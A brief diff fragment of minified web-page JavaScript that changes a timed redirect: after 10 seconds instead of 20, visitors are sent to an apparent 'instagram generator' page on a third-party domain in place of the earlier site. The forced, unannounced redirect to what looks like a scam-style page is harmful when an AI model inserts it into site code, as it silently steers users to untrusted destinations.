@@ -93,5 +93,5 @@ e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let
 
 ();
 setTimeout(function () {
-   window.location.href = "https://zonapintar.com/";
-}, 20000);
+   window.location.href = "https://instagram.mediabox.link/generator";
+}, 10000);
